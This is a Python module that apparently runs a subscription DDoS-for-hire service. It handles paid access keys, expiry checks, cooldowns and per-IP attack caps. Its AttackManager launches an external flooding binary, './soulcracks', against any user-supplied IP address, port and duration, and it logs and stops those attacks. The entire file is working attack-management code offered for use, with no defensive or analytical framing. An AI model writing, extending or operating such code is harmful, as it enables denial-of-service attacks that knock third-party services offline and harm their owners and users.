import asyncio
import datetime
import json
import logging
import os
import random
import string
import time
from typing import Dict, Optional
import re

from .constants import *

logger = logging.getLogger(__name__)

class RateLimiter:
    def __init__(self):
        self.command_history: Dict[str, list] = {}
    
    def can_execute(self, user_id: str) -> bool:
        current_time = time.time()
        if user_id not in self.command_history:
            self.command_history[user_id] = []
        
        # Clean old commands
        self.command_history[user_id] = [
            cmd_time for cmd_time in self.command_history[user_id]
            if current_time - cmd_time < RATE_LIMIT_WINDOW
        ]
        
        if len(self.command_history[user_id]) >= MAX_COMMANDS_PER_WINDOW:
            return False
        
        self.command_history[user_id].append(current_time)
        return True

class UserManager:
    def __init__(self):
        self.users: Dict[str, dict] = {}
        self.keys: Dict[str, str] = {}
        self.user_processes: Dict[str, dict] = {}
        self.last_attack_time: Dict[str, float] = {}
        self.admin_key_counts: Dict[str, int] = {}
        self.last_key_reset: datetime.datetime = datetime.datetime.now(IST_TZ)
        self.ip_attack_count: Dict[str, int] = {}
        self.load_data()

    def load_data(self) -> None:
        try:
            if os.path.exists(USER_FILE):
                with open(USER_FILE, "r") as file:
                    self.users = json.load(file)
            if os.path.exists(KEY_FILE):
                with open(KEY_FILE, "r") as file:
                    self.keys = json.load(file)
        except Exception as e:
            logger.error(f"Error loading data: {e}")
            for file in [USER_FILE, KEY_FILE]:
                if os.path.exists(file):
                    os.rename(file, f"{file}.bak.{int(time.time())}")
            self.users = {}
            self.keys = {}

    def save_data(self) -> None:
        try:
            for data, filename in [(self.users, USER_FILE), (self.keys, KEY_FILE)]:
                temp_file = f"{filename}.tmp"
                with open(temp_file, "w") as file:
                    json.dump(data, file, indent=2)
                os.replace(temp_file, filename)
        except Exception as e:
            logger.error(f"Error saving data: {e}")
            raise

    def generate_key(self, length: int = KEY_LENGTH, custom_key: str = None) -> str:
        if custom_key:
            if not re.match(r'^[a-zA-Z0-9]{8,32}$', custom_key):
                raise ValueError("Invalid custom key format")
            return custom_key
        try:
            return ''.join(random.SystemRandom().choice(string.ascii_letters + string.digits) 
                         for _ in range(length))
        except Exception:
            logger.warning("Falling back to less secure random generation")
            return ''.join(random.choice(string.ascii_letters + string.digits) 
                         for _ in range(length))

    def add_time_to_current_date(self, hours: int = 0, days: int = 0) -> str:
        try:
            current_time = datetime.datetime.now(IST_TZ)
            new_time = current_time + datetime.timedelta(hours=hours, days=days)
            return new_time.strftime('%Y-%m-%d %H:%M:%S')
        except Exception as e:
            logger.error(f"Error in time calculation: {e}")
            raise

    def is_user_authorized(self, user_id: str) -> bool:
        try:
            if user_id not in self.users:
                return False
            current_time = datetime.datetime.now(IST_TZ)
            expiration = datetime.datetime.strptime(
                self.users[user_id]['expiration'], 
                '%Y-%m-%d %H:%M:%S'
            ).replace(tzinfo=IST_TZ)
            return current_time <= expiration
        except Exception as e:
            logger.error(f"Error checking user authorization: {e}")
            return False

    def can_user_attack(self, user_id: str, target_ip: str) -> tuple[bool, Optional[str]]:
        if user_id in ADMIN_IDS:
            return True, None
        
        if self.ip_attack_count.get(target_ip, 0) >= MAX_ATTACKS_PER_IP:
            return False, f"Maximum attacks reached for IP {target_ip}"
        
        active_attacks = sum(1 for process in self.user_processes.values() 
                           if process["user_id"] == user_id)
        if active_attacks >= MAX_CONCURRENT_ATTACKS:
            return False, f"Maximum concurrent attacks ({MAX_CONCURRENT_ATTACKS}) reached"

        current_time = time.time()
        if user_id in self.last_attack_time:
            time_passed = current_time - self.last_attack_time[user_id]
            if time_passed < COOLDOWN_TIME:
                return False, f"Please wait {int(COOLDOWN_TIME - time_passed)} seconds"
        
        return True, None

    def reset_daily_key_counts(self) -> None:
        current_time = datetime.datetime.now(IST_TZ)
        if current_time.date() > self.last_key_reset.date():
            self.admin_key_counts = {}
            self.last_key_reset = current_time

    def can_generate_keys(self, admin_id: str) -> bool:
        self.reset_daily_key_counts()
        return self.admin_key_counts.get(admin_id, 0) < MAX_KEYS_PER_ADMIN

    def get_subscription_status(self, user_id: str) -> tuple[bool, Optional[str], Optional[str]]:
        if user_id not in self.users:
            return False, None, None
        
        try:
            current_time = datetime.datetime.now(IST_TZ)
            expiration = datetime.datetime.strptime(
                self.users[user_id]['expiration'],
                '%Y-%m-%d %H:%M:%S'
            ).replace(tzinfo=IST_TZ)
            
            if current_time > expiration:
                return False, "Expired", None
            
            remaining = expiration - current_time
            days = remaining.days
            hours = remaining.seconds // 3600
            minutes = (remaining.seconds % 3600) // 60
            
            time_str = f"{days}d {hours}h {minutes}m"
            return True, "Active", time_str
        except Exception as e:
            logger.error(f"Error getting subscription status: {e}")
            return False, "Error", None

class AttackManager:
    def __init__(self, user_manager: UserManager):
        self.user_manager = user_manager
        self.attack_history: Dict[str, list] = {}

    def validate_attack_params(self, target_ip: str, port: str, duration: str) -> tuple[bool, str]:
        try:
            if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', target_ip):
                return False, "Invalid IP address format"

            port_num = int(port)
            duration_num = int(duration)

            if not (1 <= port_num <= 65535):
                return False, "Invalid port number (1-65535)"
            if not (1 <= duration_num <= MAX_DURATION):
                return False, f"Duration must be between 1 and {MAX_DURATION} seconds"
            
            return True, ""
        except ValueError:
            return False, "Invalid parameters"

    def validate_executable(self) -> tuple[bool, str]:
        executable_path = './soulcracks'
        if not os.path.exists(executable_path):
            return False, "Attack executable not found"
        if not os.access(executable_path, os.X_OK):
            return False, "Attack executable not executable"
        return True, ""

    async def cleanup_old_processes(self):
        current_time = time.time()
        for attack_id in list(self.user_manager.user_processes.keys()):
            process_info = self.user_manager.user_processes[attack_id]
            if process_info["process"].returncode is not None:
                duration = current_time - process_info["start_time"]
                logger.info(f"Attack completed for user {process_info['user_id']}, "
                          f"duration: {duration:.2f}s")
                
                target_ip = process_info["target_ip"]
                self.user_manager.ip_attack_count[target_ip] = max(
                    0, self.user_manager.ip_attack_count.get(target_ip, 1) - 1
                )
                
                del self.user_manager.user_processes[attack_id]

    def log_attack(self, user_id: str, target_ip: str, port: str, duration: str) -> None:
        if user_id not in self.attack_history:
            self.attack_history[user_id] = []
        
        self.attack_history[user_id].append({
            "timestamp": datetime.datetime.now(IST_TZ).isoformat(),
            "target_ip": target_ip,
            "port": port,
            "duration": duration
        })

        self.attack_history[user_id] = self.attack_history[user_id][-10:]

    async def start_attack(self, target_ip: str, port: str, duration: str, user_id: str) -> tuple[bool, str]:
        valid, error_msg = self.validate_executable()
        if not valid:
            return False, error_msg

        valid, error_msg = self.validate_attack_params(target_ip, port, duration)
        if not valid:
            return False, error_msg

        can_attack, error_msg = self.user_manager.can_user_attack(user_id, target_ip)
        if not can_attack:
            return False, error_msg

        try:
            self.user_manager.ip_attack_count[target_ip] = self.user_manager.ip_attack_count.get(target_ip, 0) + 1
            
            command = ['./soulcracks', target_ip, port, duration, str(DEFAULT_THREADS)]
            process = await asyncio.create_subprocess_exec(
                *command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )

            attack_id = f"{user_id}_{int(time.time())}"

            self.user_manager.user_processes[attack_id] = {
                "process": process,
                "command": command,
                "target_ip": target_ip,
                "port": port,
                "start_time": time.time(),
                "user_id": user_id
            }

            self.log_attack(user_id, target_ip, port, duration)

            if user_id not in ADMIN_IDS:
                self.user_manager.last_attack_time[user_id] = time.time()

            return True, f"Attack started on {target_ip}:{port} for {duration} seconds"
        except Exception as e:
            logger.error(f"Error starting attack: {e}")
            self.user_manager.ip_attack_count[target_ip] = max(
                0, self.user_manager.ip_attack_count.get(target_ip, 1) - 1
            )
            return False, "Error starting attack process"

    async def stop_attack(self, user_id: str) -> tuple[bool, str]:
        if not any(info["user_id"] == user_id for info in self.user_manager.user_processes.values()):
            return False, "No active attacks found"

        try:
            stopped_count = 0
            for attack_id, process_info in list(self.user_manager.user_processes.items()):
                if process_info["user_id"] == user_id:
                    process = process_info["process"]
                    if process.returncode is None:
                        process.terminate()
                        await process.wait()
                        stopped_count += 1
                        
                        target_ip = process_info["target_ip"]
                        self.user_manager.ip_attack_count[target_ip] = max(
                            0, self.user_manager.ip_attack_count.get(target_ip, 1) - 1
                        )
                        
                        del self.user_manager.user_processes[attack_id]
            
            return True, f"Stopped {stopped_count} attack(s) successfully"
        except Exception as e:
            logger.error(f"Error stopping attacks: {e}")
            return False, "Error stopping attack process"